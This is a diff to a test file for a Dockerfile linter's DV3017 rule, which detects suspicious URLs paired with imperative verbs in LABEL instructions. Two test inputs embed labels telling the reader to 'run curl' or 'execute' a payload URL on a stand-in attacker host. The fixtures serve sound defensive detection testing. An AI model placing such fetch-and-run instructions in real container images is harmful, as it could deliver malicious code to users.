@@ -309,6 +309,18 @@ describe('DV3017 - Suspicious URL with imperative context in LABEL', () => {
   it('passes docs URL', () => {
     expect(hasRule(lintDockerfile('FROM ubuntu\nLABEL docs="https://docs.example.com/getting-started"'), 'DV3017')).toBe(false);
   });
+  it('passes label-schema.org multi-pair LABEL where Run is in description and URL is in separate key', () => {
+    // kube-bench pattern: description="Run the CIS Kubernetes Benchmark tests" + separate url=...
+    const df = 'FROM golang:1.21\n' +
+      'LABEL org.label-schema.description="Run the CIS Kubernetes Benchmark tests" \\\n' +
+      '      org.label-schema.url="https://github.com/aquasecurity/kube-bench" \\\n' +
+      '      org.label-schema.vendor="Aqua Security"';
+    expect(hasRule(lintDockerfile(df), 'DV3017')).toBe(false);
+  });
+  it('still flags when imperative verb and URL appear in the same label value', () => {
+    expect(hasRule(lintDockerfile('FROM ubuntu\nLABEL desc="run curl https://evil.com/payload"'), 'DV3017')).toBe(true);
+    expect(hasRule(lintDockerfile('FROM ubuntu\nLABEL x="execute https://evil.com/get-updates"'), 'DV3017')).toBe(true);
+  });
 });
 
 describe('DV3018 - chpasswd plaintext password', () => {
